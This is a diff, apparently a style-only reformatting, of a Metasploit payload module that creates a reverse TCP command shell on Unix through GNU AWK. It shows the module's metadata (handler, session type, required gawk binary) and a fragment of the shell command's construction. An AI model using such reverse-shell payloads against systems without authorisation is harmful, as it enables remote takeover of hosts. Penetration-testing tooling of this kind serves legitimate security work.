@@ -3,37 +3,36 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 154
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Reverse TCP (via AWK)',
-      'Description'   => 'Creates an interactive shell via GNU AWK',
-      'Author'        =>
-        [
+    super(
+      merge_info(
+        info,
+        'Name' => 'Unix Command Shell, Reverse TCP (via AWK)',
+        'Description' => 'Creates an interactive shell via GNU AWK',
+        'Author' => [
           'espreto <robertoespreto[at]gmail.com>',
           'Ulisses Castro <uss.thebug[at]gmail.com>',
           'Gabriel Quadros <gquadrossilva[at]gmail.com>'
         ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'gawk',
-      'Payload'       =>
-        {
-          'Offsets' => { },
+        'License' => MSF_LICENSE,
+        'Platform' => 'unix',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'RequiredCmd' => 'gawk',
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
         }
-      ))
+      )
+    )
   end
 
   #
@@ -61,6 +60,6 @@ module MetasploitModule
         close(s)
       }'
     AWK
-    awkcmd.gsub!("\n",'').gsub!('  ', '')
+    awkcmd.gsub!("\n", '').gsub!('  ', '')
   end
 end
